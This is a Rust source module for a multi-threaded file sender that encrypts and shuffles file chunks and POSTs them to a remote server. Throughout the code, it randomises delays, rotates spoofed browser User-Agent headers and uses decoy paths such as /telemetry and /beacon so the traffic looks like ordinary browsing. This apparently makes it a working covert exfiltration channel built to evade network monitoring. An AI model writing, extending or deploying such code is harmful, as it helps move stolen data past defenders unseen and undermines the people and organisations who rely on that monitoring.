//! Multi-threaded sender: encrypts chunks, shuffles them, and dispatches
//! them over `sender_threads` parallel threads, each adding a random
//! inter-packet delay and mimicking normal HTTP browser traffic.

use std::sync::{
    Arc,
    atomic::{AtomicUsize, Ordering},
};
use std::time::Duration;

use anyhow::{Context, Result};
use base64::{Engine as _, engine::general_purpose::STANDARD as B64};
use crossbeam_channel::{bounded, Receiver};
use rand::seq::SliceRandom;
use rand::Rng;
use reqwest::blocking::Client;
use tracing::{error, info, warn};
use uuid::Uuid;

use crate::chunker::Chunk;
use crate::config::ClientArgs;
use crate::crypto;
use crate::protocol::{AckResponse, ChunkEnvelope, CompleteResponse};

// ── Browser-like HTTP headers ─────────────────────────────────────────────────

static USER_AGENTS: &[&str] = &[
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
];

static URL_PATHS: &[&str] = &[
    "/update",
    "/api/data",
    "/sync",
    "/upload",
    "/submit",
    "/post",
    "/api/v1/event",
    "/beacon",
    "/telemetry",
    "/analytics/collect",
];

fn random_ua() -> &'static str {
    USER_AGENTS[rand::thread_rng().gen_range(0..USER_AGENTS.len())]
}

fn random_path() -> &'static str {
    URL_PATHS[rand::thread_rng().gen_range(0..URL_PATHS.len())]
}

// ── Sender ────────────────────────────────────────────────────────────────────

/// Encrypt all chunks, shuffle, then fan them out to `args.threads` sender
/// threads.  Blocks until all chunks are acknowledged (or permanently fail).
///
/// Returns `Ok(())` on success.
pub fn run(chunks: Vec<Chunk>, args: &ClientArgs, passkey: &str) -> Result<()> {
    // ── Derive keys ───────────────────────────────────────────────────────
    info!("Deriving cryptographic keys from passkey …");
    let keys = crypto::derive_keys(passkey).context("Key derivation failed")?;
    let keys = Arc::new(keys);

    let session_id = Uuid::new_v4().to_string();
    info!(session_id = %session_id, "Session ID");

    // ── Build envelopes ───────────────────────────────────────────────────
    info!("Encrypting {} chunk(s) …", chunks.len());
    let mut envelopes: Vec<ChunkEnvelope> = chunks
        .iter()
        .map(|chunk| build_envelope(chunk, &session_id, &keys.public_key))
        .collect::<Result<Vec<_>>>()?;

    // ── Shuffle ───────────────────────────────────────────────────────────
    envelopes.shuffle(&mut rand::thread_rng());
    info!("Chunks shuffled, starting transmission …");

    let total = envelopes.len();
    let acked = Arc::new(AtomicUsize::new(0));
    let file_name = chunks[0].file_name.clone();

    // ── Channel → thread pool ─────────────────────────────────────────────
    let (tx, rx) = bounded::<ChunkEnvelope>(total);
    for env in envelopes {
        tx.send(env).expect("channel send");
    }
    drop(tx); // close the channel so threads know when to stop

    let server_url = args.server.trim_end_matches('/').to_string();
    let n_threads = args.threads;
    let interval_min = Duration::from_millis(args.interval_min_ms);
    let interval_max = Duration::from_millis(args.interval_max_ms);

    // ── Shared HTTP client with connection pool limits ───────────────────────
    let client = Arc::new(
        Client::builder()
            .connection_verbose(false)
            .pool_max_idle_per_host(10)
            .pool_idle_timeout(Duration::from_secs(60))
            .build()
            .expect("Failed to build HTTP client"),
    );

    // Track chunk hashes for verification
    let chunk_hashes: Arc<Vec<String>> = Arc::new(
        chunks.iter().map(|c| crypto::sha256_hex(&c.data)).collect(),
    );

    let mut handles = Vec::with_capacity(n_threads);

    for thread_id in 0..n_threads {
        let rx: Receiver<ChunkEnvelope> = rx.clone();
        let server_url = server_url.clone();
        let acked = Arc::clone(&acked);
        let chunk_hashes = Arc::clone(&chunk_hashes);
        let client = Arc::clone(&client);

        let handle = std::thread::spawn(move || {
            sender_thread(
                thread_id,
                rx,
                &server_url,
                interval_min,
                interval_max,
                total,
                acked,
                chunk_hashes,
                &client,
            );
        });
        handles.push(handle);
    }

    for h in handles {
        let _ = h.join();
    }

    let done = acked.load(Ordering::SeqCst);
    if done < total {
        anyhow::bail!("Only {}/{} chunks were acknowledged", done, total);
    }

    info!("All {} chunks acknowledged. Waiting for server completion …", total);

    // ── Poll for completion ───────────────────────────────────────────────
    wait_for_completion(&server_url, &session_id, &file_name, &chunks)
}

// ── Individual sender thread ──────────────────────────────────────────────────

#[allow(clippy::too_many_arguments)]
fn sender_thread(
    thread_id: usize,
    rx: Receiver<ChunkEnvelope>,
    server_url: &str,
    interval_min: Duration,
    interval_max: Duration,
    total: usize,
    acked: Arc<AtomicUsize>,
    chunk_hashes: Arc<Vec<String>>,
    client: &Client,
) {

    let mut rng = rand::thread_rng();

    while let Ok(envelope) = rx.recv() {
        // Random inter-packet delay
        let delay_ms = rng.gen_range(interval_min.as_millis()..=interval_max.as_millis()) as u64;
        std::thread::sleep(Duration::from_millis(delay_ms));

        let chunk_index = envelope.chunk_index;
        let expected_hash = chunk_hashes[chunk_index].clone();
        let url = format!("{}{}", server_url, random_path());
        let ua = random_ua();

        match send_chunk(&client, &url, ua, &envelope) {
            Ok(ack) => {
                if ack.status == "ok" {
                    if ack.chunk_hash != expected_hash {
                        warn!(
                            thread = thread_id,
                            chunk = chunk_index,
                            "Hash mismatch in ACK! expected={} got={}",
                            expected_hash,
                            ack.chunk_hash
                        );
                    } else {
                        let prev = acked.fetch_add(1, Ordering::SeqCst);
                        info!(
                            thread = thread_id,
                            chunk = chunk_index,
                            progress = format!("{}/{}", prev + 1, total),
                            "✓ Chunk ACK'd"
                        );
                    }
                } else {
                    error!(
                        thread = thread_id,
                        chunk = chunk_index,
                        error = ?ack.error,
                        "Server returned error ACK"
                    );
                }
            }
            Err(e) => {
                error!(thread = thread_id, chunk = chunk_index, error = %e, "HTTP request failed");
            }
        }
    }
}

/// POST a single `ChunkEnvelope` to the server and parse the `AckResponse`.
fn send_chunk(
    client: &Client,
    url: &str,
    user_agent: &str,
    envelope: &ChunkEnvelope,
) -> Result<AckResponse> {
    let resp = client
        .post(url)
        .header("User-Agent", user_agent)
        .header(
            "Accept",
            "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        )
        .header("Accept-Language", "en-US,en;q=0.5")
        .header("Accept-Encoding", "gzip, deflate, br")
        .header("Connection", "keep-alive")
        .json(envelope)
        .send()
        .context("HTTP POST failed")?;

    let status = resp.status();
    let text = resp.text().context("Failed to read response body")?;

    if !status.is_success() {
        anyhow::bail!("Server returned HTTP {}: {}", status, text);
    }

    let ack: AckResponse = serde_json::from_str(&text).context("Failed to parse AckResponse")?;
    Ok(ack)
}

/// Build an encrypted `ChunkEnvelope` for a single chunk.
fn build_envelope(chunk: &Chunk, session_id: &str, pub_key: &rsa::RsaPublicKey) -> Result<ChunkEnvelope> {
    let chunk_hash = crypto::sha256_hex(&chunk.data);
    let (encrypted_key_bytes, ciphertext) =
        crypto::encrypt_chunk(pub_key, &chunk.data).context("Chunk encryption failed")?;

    Ok(ChunkEnvelope {
        version: 1,
        session_id: session_id.to_string(),
        file_name: chunk.file_name.clone(),
        total_chunks: chunk.total,
        chunk_index: chunk.index,
        chunk_hash,
        encrypted_key: B64.encode(&encrypted_key_bytes),
        payload: B64.encode(&ciphertext),
    })
}

// ── Completion handshake ──────────────────────────────────────────────────────

/// Poll `/complete/<session_id>` with exponential back-off until the server
/// signals the file is fully reassembled, then verify the file hash.
fn wait_for_completion(
    server_url: &str,
    session_id: &str,
    _file_name: &str,
    chunks: &[Chunk],
) -> Result<()> {
    let client = Client::builder().build()?;
    let url = format!("{}/complete/{}", server_url, session_id);

    let expected_hash = {
        let mut all_data = Vec::new();
        let mut sorted = chunks.to_vec();
        sorted.sort_by_key(|c| c.index);
        for c in &sorted {
            all_data.extend_from_slice(&c.data);
        }
        crypto::sha256_hex(&all_data)
    };

    let mut delay = Duration::from_millis(500);
    let max_wait = Duration::from_secs(300);
    let mut elapsed = Duration::ZERO;

    loop {
        let resp = client.get(&url).send();

        match resp {
            Ok(r) if r.status().is_success() => {
                let text = r.text()?;
                if let Ok(complete) = serde_json::from_str::<CompleteResponse>(&text) {
                    if complete.status == "complete" {
                        if complete.file_hash == expected_hash {
                            info!(
                                file = complete.file_name,
                                hash = complete.file_hash,
                                "✅ File transfer complete – hash verified!"
                            );
                            println!(
                                "\n✅ Transfer complete!\n   File : {}\n   Hash : {}\n   Status: VERIFIED",
                                complete.file_name, complete.file_hash
                            );
                            return Ok(());
                        } else {
                            anyhow::bail!(
                                "File hash mismatch! expected={} server={}",
                                expected_hash,
                                complete.file_hash
                            );
                        }
                    }
                }
            }
            Ok(r) if r.status().as_u16() == 202 => {
                // still assembling
            }
            Ok(r) => {
                warn!("Unexpected status from /complete: {}", r.status());
            }
            Err(e) => {
                warn!("Error polling /complete: {}", e);
            }
        }

        if elapsed >= max_wait {
            anyhow::bail!("Timed out waiting for server completion after {:?}", max_wait);
        }

        std::thread::sleep(delay);
        elapsed += delay;
        delay = (delay * 2).min(Duration::from_secs(10));
    }
}
